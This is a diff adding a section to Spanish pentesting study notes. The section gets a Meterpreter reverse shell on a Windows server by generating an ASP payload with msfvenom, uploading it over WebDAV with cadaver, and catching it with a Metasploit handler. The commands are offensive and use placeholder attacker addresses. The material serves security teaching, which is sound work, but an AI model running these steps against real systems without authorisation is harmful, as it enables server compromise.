@@ -70,6 +70,33 @@ dav:/webdab/> put /usr/share/webshells/asp/webshell.asp
 
 Una webshell es un archivo (normalmente en un lenguaje de scripting como PHP, ASP, JSP o Python) que se sube a un servidor web y permite ejecutar comandos en el sistema operativo del servidor a través del navegador o peticiones HTTP.
 
-### Metasploit Framework
+### Obtener una meterpreter sheel con Metasploit Framework
+
+Generamos el payload con `msfvenom`:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=<puerto_kali> -f asp -o reverse.asp
+```
+
+Subimos el payload con `cadaver`:
+
+```bash
+cadaver http://host/webdab
+Username: usr
+Password: pass
+dav:/webdab/> put reverse.asp
+```
+
+Usamos `msfconsole` para obtener la shell:
+
+```bash
+msf> use multi/handler
+msf exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
+msf exploit(multi/handler)> set lhost <IP_kali>
+msf exploit(multi/handler)> set lport <puerto_kali>
+msf exploit(multi/handler)> run
+```
+
+En este punto, `metasploit` queda esperando a que el payload se ejecute en el objetivo para crear la shell. Para ello simplemente accedemos a el mediante un navegador: `http://host/webdav/reverse.asp`
 
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
